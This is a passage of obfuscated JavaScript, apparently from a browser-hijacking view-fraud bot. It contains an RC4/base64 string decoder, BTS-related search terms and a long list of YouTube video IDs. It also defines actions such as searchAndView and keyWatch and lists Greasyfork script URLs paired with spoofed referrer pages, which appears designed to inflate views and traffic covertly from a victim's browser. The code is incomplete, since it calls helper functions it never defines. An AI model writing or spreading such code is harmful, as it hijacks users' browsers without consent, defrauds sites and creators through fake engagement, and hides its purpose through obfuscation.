'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0xd70 + 0x2174 + 0xb * -0x443);

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1 * 0x2485 + -0x26f * 0x6 + 0x331f);
    let h = e[f];
    return h;
  }, d(b, c);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1 * 0x2485 + -0x26f * 0x6 + 0x331f);
    let h = e[f];
    if (b['BznmLg'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1294 + 0x14c0 + -0x2 * 0x116, s, t, u = 0x16dd + 0x46 * 0x6 + -0x1881; t = n['charAt'](u++); ~t && (s = r % (-0x1e79 * 0x1 + -0x259d * 0x1 + 0x441a) ? s * (0x1ac2 + -0x1e90 + -0x2 * -0x207) + t : t, r++ % (-0x11d6 + -0x160e + -0x27e8 * -0x1)) ? p += String['fromCharCode'](-0xb * 0x23 + -0xb88 * 0x1 + -0x4 * -0x382 & s >> (-(-0x522 + -0x21d * -0xc + -0x1438) * r & -0x3df * 0x5 + 0x1e62 + -0x3 * 0x3ab)) : 0x152a + 0xb * -0x2e1 + -0x1 * -0xa81) {
          t = o['indexOf'](t);
        }
        for (let v = 0x2e2 + -0x6cd * -0x5 + -0x24e3, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x24f8 + 0x1913 + -0x3dfb))['slice'](-(-0x232 * -0x3 + 0x21f2 * 0x1 + -0x2886));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1a05 + 0x26a + 0x179b,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x174 * 0x1a + 0x257 + 0x2371; u < -0x1 * -0x1079 + 0x49f * 0x8 + -0x1 * 0x3471; u++) {
          p[u] = u;
        }
        for (u = -0xe6e * 0x2 + -0x1389 + 0x3065; u < 0x637 * -0x1 + -0x221c + 0x2953; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1 * -0x2665 + -0x2109 + -0x45c), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x261a + -0x12cd * -0x2 + 0x80 * 0x1, q = -0xd6b + 0x9 * -0x272 + 0x236d * 0x1;
        for (let v = 0x43a * -0x5 + -0x26e3 + 0x23 * 0x1b7; v < n['length']; v++) {
          u = (u + (0xb * 0x27d + 0x1 * -0x765 + -0x13f9 * 0x1)) % (-0x35 * -0x7d + -0xb * -0x32b + -0x2b7 * 0x16), q = (q + p[u]) % (0x1 * -0xe9a + 0x128f * -0x2 + 0x34b8), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * 0x2219 + -0x1 * 0x18df + 0x3bf8)]);
        }
        return t;
      };
      b['vSFQmd'] = m, c = arguments, b['BznmLg'] = !![];
    }
    const j = e[-0xb5d * -0x1 + -0x1 * -0x949 + -0x14a6 * 0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['lqzecD'] === undefined && (b['lqzecD'] = !![]), h = b['vSFQmd'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    W(0x15, 'a1bb') + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    X(0x12) + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    X(0x11) + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    X(0x8) + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    X(0x6) + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x9) + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + V(0x2) + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + V(0x17)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + V(0xd) + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + X(0xa) + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
